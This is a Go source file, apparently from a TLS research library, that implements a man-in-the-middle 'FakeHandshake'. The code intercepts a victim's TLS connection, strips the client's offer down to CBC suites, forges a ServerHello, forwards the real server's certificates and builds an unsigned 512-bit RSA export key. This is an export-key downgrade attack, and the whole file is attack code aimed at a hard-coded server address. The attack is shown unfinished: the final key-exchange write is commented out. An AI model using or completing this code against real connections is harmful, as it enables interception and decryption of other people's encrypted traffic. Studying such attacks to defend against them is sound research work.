package ztls

import (
	"crypto/rand"
	"crypto/rsa"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
)

type MITMConn struct {
	victimRaw net.Conn
	serverRaw net.Conn
	victim    *Conn
	server    *Conn
	config    *Config
}

type mitmState struct {
	originalHello      *clientHelloMsg
	fakeClientHello    *clientHelloMsg
	victimFinishedHash finishedHash
	serverFinishedHash finishedHash

	originalServerHello *serverHelloMsg
	fakeServerHello     *serverHelloMsg

	certs *certificateMsg

	fakeServerKex *serverKeyExchangeMsg
}

func (m *MITMConn) Read(b []byte) (int, error) {
	return m.victim.Read(b)
}

func (m *MITMConn) Write(b []byte) (int, error) {
	return m.victim.Write(b)
}

func (m *MITMConn) FakeHandshake() (err error) {
	m.serverRaw, err = net.Dial("tcp", "141.212.120.89:443")
	if err != nil {
		return
	}
	m.victim = Server(m.victimRaw, m.config)
	m.server = Client(m.serverRaw, m.config)
	victim := m.victim
	server := m.server

	var ms mitmState
	var msg interface{}
	var ok bool
	msg, err = victim.readHandshake()
	if err != nil {
		return
	}
	ms.originalHello, ok = msg.(*clientHelloMsg)
	if !ok {
		return errors.New("did not receive a client hello")
	}

	vers := ms.originalHello.vers

	fakeClientHello := &clientHelloMsg{
		vers:                ms.originalHello.vers,
		compressionMethods:  []uint8{compressionNone},
		random:              ms.originalHello.random,
		ocspStapling:        false,
		serverName:          ms.originalHello.serverName,
		supportedCurves:     []CurveID{},
		supportedPoints:     []uint8{},
		nextProtoNeg:        false,
		secureRenegotiation: false,
		heartbeatEnabled:    false,
		cipherSuites:        CBCSuiteIDList,
	}

	server.writeRecord(recordTypeHandshake, fakeClientHello.marshal())

	ms.fakeClientHello = fakeClientHello
	ms.victimFinishedHash = newFinishedHash(vers)
	ms.serverFinishedHash = newFinishedHash(vers)
	ms.victimFinishedHash.Write(ms.originalHello.marshal())
	ms.serverFinishedHash.Write(ms.fakeClientHello.marshal())

	// Read the server hello
	msg, err = server.readHandshake()
	if err != nil {
		return
	}

	ms.originalServerHello, ok = msg.(*serverHelloMsg)
	if !ok {
		return errors.New("Could not read server hello from actual server")
	}

	// Make a fake serverHello
	fakeServerHello := &serverHelloMsg{
		vers:                ms.originalServerHello.vers,
		random:              ms.originalServerHello.random,
		sessionId:           ms.originalServerHello.sessionId,
		cipherSuite:         TLS_RSA_WITH_AES_128_CBC_SHA,
		compressionMethod:   compressionNone,
		nextProtoNeg:        false,
		ocspStapling:        false,
		ticketSupported:     false,
		secureRenegotiation: false,
		heartbeatEnabled:    false,
	}
	victim.writeRecord(recordTypeHandshake, fakeServerHello.marshal())

	ms.fakeServerHello = fakeServerHello
	ms.victimFinishedHash.Write(fakeServerHello.marshal())
	ms.serverFinishedHash.Write(ms.originalServerHello.marshal())

	// Read the server certificates
	msg, err = server.readHandshake()
	if err != nil {
		return
	}
	ms.certs, ok = msg.(*certificateMsg)
	if !ok {
		return errors.New("Cound not read cert msg from actual server")
	}

	// Send server certificates
	victim.writeRecord(recordTypeHandshake, ms.certs.marshal())

	ms.victimFinishedHash.Write(ms.certs.marshal())
	ms.serverFinishedHash.Write(ms.certs.marshal())

	// Send export key exchange
	var exportKey *rsa.PrivateKey
	exportKey, err = rsa.GenerateKey(rand.Reader, 512)
	if err != nil {
		return
	}
	modulus := exportKey.N.Bytes()
	exponent := uint32(exportKey.E)
	exponentBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(exponentBuf, exponent)
	exponentLength := 4
	for _, v := range exponentBuf {
		if v == byte(0) {
			exponentLength--
		} else {
			break
		}
	}
	exponentBuf = exponentBuf[4-exponentLength:]
	fmt.Println(exponentBuf)
	exportParams := rsaExportParams{
		modulusLength:          uint16(len(modulus)),
		rawModulus:             modulus,
		exponentLength:         uint16(exponentLength),
		rawExponent:            exponentBuf,
		signatureHashAlgorithm: uint16(0x0401),
		signatureLength:        uint16(0),
		rawSignature:           []byte{},
	}
	fakeServerKex := &serverKeyExchangeMsg{
		key: exportParams.marshal(),
	}
	//	victim.writeRecord(recordTypeHandshake, fakeServerKex.marshal())

	ms.fakeServerKex = fakeServerKex
	ms.victimFinishedHash.Write(ms.fakeServerKex.marshal())

	return nil
}
